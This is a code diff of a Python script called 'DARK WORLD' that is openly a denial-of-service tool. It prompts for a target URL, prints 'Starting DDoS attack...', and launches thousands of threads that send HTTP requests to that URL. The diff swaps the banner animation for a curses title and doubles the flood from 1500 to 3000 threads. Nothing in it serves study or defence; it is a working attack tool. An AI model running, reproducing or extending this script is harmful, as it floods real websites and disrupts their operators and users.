@@ -1,7 +1,34 @@
 import requests
 import threading
+import curses
 import time
-import os
+
+# Function for the animated title
+def display_animation(stdscr):
+    curses.curs_set(0)
+    stdscr.clear()
+    stdscr.refresh()
+    animation_text = "DARK WORLD"
+    creator_text = "Creator: Rahad Hasan"
+
+    # Center the animation text
+    height, width = stdscr.getmaxyx()
+    x = width // 2 - len(animation_text) // 2
+    y = height // 2
+
+    # Display "DARK WORLD" with a blinking effect
+    for i in range(4):
+        stdscr.addstr(y, x, animation_text, curses.A_BOLD)
+        stdscr.addstr(y + 1, x - 5, creator_text)
+        stdscr.refresh()
+        time.sleep(0.3)
+        stdscr.clear()
+        time.sleep(0.3)
+
+    # Final display before attack
+    stdscr.addstr(y, x, animation_text, curses.A_BOLD)
+    stdscr.refresh()
+    time.sleep(1)
 
 # Function to send HTTP requests
 def send_request(url):
@@ -12,44 +39,20 @@ def send_request(url):
         except requests.exceptions.RequestException as e:
             print(f"Error sending request to {url}: {e}")
 
-# Function to clear the console screen
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-# Function to animate the banner
-def animate_banner():
-    banner_text = "DARK WORLD"
-    banner_length = len(banner_text)
-
-    # Clear the screen
-    clear_screen()
-
-    # Animate the banner
-    while True:
-        for i in range(banner_length):
-            clear_screen()
-            print(banner_text[i:] + banner_text[:i])
-            time.sleep(0.5)
-
 # Main function
-def main():
-    # Start the banner animation in a separate thread after 1 second
-    banner_thread = threading.Timer(1, animate_banner)
-    banner_thread.start()
-
-    # Display creator information
-    print("Creator: Rahad Hasan")
+def main(stdscr):
+    # Run the animation
+    display_animation(stdscr)
 
     # Get the target URL from the user
     target_url = input("Enter the target URL: ")
 
     # Start the DDoS attack
     print("Starting DDoS attack...")
-    for _ in range(1500):
+    for _ in range(3000):
         # Create a new thread for each request
         thread = threading.Thread(target=send_request, args=(target_url,))
         thread.start()
 
-# Run the script when executed as the main program
 if __name__ == "__main__":
-    main()
+    curses.wrapper(main)
